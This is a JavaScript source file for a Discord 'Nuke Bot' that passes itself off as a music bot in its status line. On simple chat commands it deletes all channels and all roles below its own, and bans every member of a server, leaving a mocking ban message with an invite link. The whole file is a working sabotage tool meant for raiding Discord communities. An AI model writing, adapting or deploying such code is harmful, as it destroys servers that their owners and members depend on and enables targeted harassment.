const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log(" ")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Playing Music | n!help` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Oooops banned lol https://discord.gg/ZsXhkxW7jC | Get Rekt"));
}
if(msg.content.toLowerCase().startsWith("n!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("n!" + "ban")){
    msg.guild.members.tap(member => member.ban("ooops https://discord.gg/ZsXhkxW7jC | Get Rekt"));
}
if(msg.content.toLowerCase().startsWith("n!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | n!help" },
            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n Have Fun!"
        }
    })
}
});

nuke.login("token");